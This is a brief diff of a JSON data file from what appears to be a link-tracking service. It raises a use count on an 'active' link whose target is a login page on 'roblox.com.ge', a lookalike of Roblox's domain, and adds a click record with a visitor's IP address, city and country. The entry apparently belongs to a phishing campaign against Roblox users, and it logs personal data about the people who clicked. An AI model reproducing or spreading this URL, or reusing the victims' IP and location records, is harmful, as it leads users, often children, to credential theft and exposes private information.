@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1267,
+    "useCount": 1268,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10280,6 +10280,14 @@
         "city": "Tiwi",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777363168772,
+        "ip": "171.249.80.93",
+        "country": "Vietnam",
+        "city": "Ho Chi Minh City",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
